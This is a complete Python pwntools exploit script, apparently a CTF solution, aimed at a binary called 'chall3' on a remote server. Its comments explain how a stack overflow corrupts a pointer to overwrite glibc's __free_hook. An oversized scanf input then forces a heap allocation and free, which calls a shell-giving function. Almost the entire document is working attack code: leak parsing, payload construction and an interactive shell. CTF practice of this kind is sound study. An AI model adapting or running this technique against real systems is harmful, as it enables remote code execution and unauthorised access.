#!/usr/bin/env python3


from pwn import *

#The bug is to turn a stack overflow bug to tamper a pointer variable to create a write what where condition 
#And then finally use it overwrite the free hook and as there is no free in program we have to force the free somehow.. 
#That's where the scanf comes into play..
#When you give a large input scanf places the input in a temporary scratch buffer in stack 
#If the input is so large to threaten a buffer overflow in stack it makes a heap overflow if the input is greater than 1023.. 
#And after using the scratch buffer it has to free which internally calls free with the tampered free hook which calls the function that gives us shell..

e = ELF("./chall3")                                         
#r = process("./chall3")                                                        
r = remote("3.97.113.25",9003)
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
r.recvuntil(b"STUFF ")                                              #Parsing the Leaks to get PIE Base and LIBC Base
leak = int(r.recvuntil(b" "),16)
libc_base = leak - libc.sym["system"]
leak = int(r.recvline().rstrip(b"!!\n"),16)
pie_base = leak - e.sym["vuln"]                                           
detonator = b'A' * 40 + p64(libc_base + libc.sym["__free_hook"])    #Overflow to tamper the pointer to get write what where condition to overwrite free hook
r.send(detonator)
bomb = '0' * (1024 - len(str(e.sym["no_gadget_here_so_let_me_help_you"])))  + str(pie_base + e.sym["no_gadget_here_so_let_me_help_you"])
#Force a heap allocation by giving a way large input to trigger scanf to call scratch buffer function which makes a heap allocation 
#Then finally to free the scratch buffer it makes a call to scratch buffer free which internally calls free 
#Where our free hook overwrite will lead us to shell
r.sendline(bomb)
r.recv()
r.interactive()       #Boom!!You got a shell
r.close()

#KUDOS to redpwn simultaneity chall for this scanf trick to force heap allocation ...
#See here to know about this awesome chall https://ctftime.org/task/16472
